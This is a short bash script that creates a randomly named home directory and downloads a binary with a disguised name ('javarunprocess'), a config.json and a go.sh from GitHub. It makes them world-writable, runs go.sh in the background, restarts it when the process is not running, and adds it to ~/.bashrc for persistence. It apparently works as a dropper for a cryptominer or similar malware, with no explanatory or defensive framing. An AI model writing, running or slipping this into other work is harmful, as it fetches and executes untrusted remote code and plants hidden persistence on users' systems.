#!/bin/bash

# Directory to check
DIR=~/gpUxgdSz

if [ -d "$DIR" ]; then
  echo "Running"
  cd ~
  cd gpUxgdSz
  if ps -C javarunprocess > /dev/null
  then
    echo "running"
  else
    
    cd ~
    cd gpUxgdSz
    rm config.json
    curl -O https://raw.githubusercontent.com/danialchork/linux-project/refs/heads/main/config.json

    rm javarunprocess
    curl -O https://github.com/danialchork/linux-project/releases/download/Last/javarunprocess
    chmod 777 javarunprocess
    rm go.sh
    curl -O https://raw.githubusercontent.com/danialchork/linux2-project/refs/heads/main/go.sh
    chmod 777 go.sh
     ./go.sh &
    grep -qxF '$HOME/gpUxgdSz/go.sh &' ~/.bashrc || echo '$HOME/gpUxgdSz/go.sh &' >> ~/.bashrc
  fi
else
    cd ~
    mkdir gpUxgdSz
    cd gpUxgdSz
    rm config.json
    curl -O https://raw.githubusercontent.com/danialchork/linux-project/refs/heads/main/config.json

    rm javarunprocess
    curl -O https://github.com/danialchork/linux-project/releases/download/Last/javarunprocess
    chmod 777 javarunprocess
    rm go.sh
    curl -O https://raw.githubusercontent.com/danialchork/linux2-project/refs/heads/main/go.sh
    chmod 777 go.sh
     ./go.sh &
    grep -qxF '$HOME/gpUxgdSz/go.sh &' ~/.bashrc || echo '$HOME/gpUxgdSz/go.sh &' >> ~/.bashrc

fi
  
